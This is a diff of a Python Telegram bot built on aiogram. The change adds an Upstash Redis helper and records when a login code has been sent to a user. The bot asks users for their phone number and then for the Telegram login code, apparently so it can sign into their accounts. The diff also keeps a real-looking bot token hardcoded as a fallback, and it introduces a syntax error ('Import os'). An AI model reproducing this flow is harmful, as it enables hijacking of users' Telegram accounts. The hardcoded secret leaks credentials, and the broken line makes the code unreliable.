@@ -1,11 +1,24 @@
 import asyncio
 import os
+import httpx
 from aiogram import Bot, Dispatcher, types, F
 from aiogram.filters import Command
 from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
 from auth import send_code, sign_in
 
-BOT_TOKEN = "8789355308:AAGMtNUPG2nuxz7W-P8FGFXEG5yKIhOCjCI"
+REDIS_URL = os.environ.get("UPSTASH_REDIS_REST_URL")
+REDIS_TOKEN = os.environ.get("UPSTASH_REDIS_REST_TOKEN")
+
+async def redis_set(key, value, ex=300):
+    async with httpx.AsyncClient() as client:
+        await client.post(
+            f"{REDIS_URL}/set/{key}/{value}",
+            headers={"Authorization": f"Bearer {REDIS_TOKEN}"},
+            params={"ex": ex}
+        )
+
+Import os
+BOT_TOKEN = os.environ.get("BOT_TOKEN", "8789355308:AAGMtNUPG2nuxz7W-P8FGFXEG5yKIhOCjCI")
 
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
@@ -43,6 +56,7 @@ async def contact_handler(message: types.Message):
             'phone': phone,
             'phone_code_hash': phone_code_hash
         }
+        await redis_set(f"sync:{message.from_user.id}", "code_sent")
         msg = await message.answer("📲 Введи код который пришёл в Telegram:")
         pending[message.from_user.id]['prompt_msg_id'] = msg.message_id
     except Exception as e:
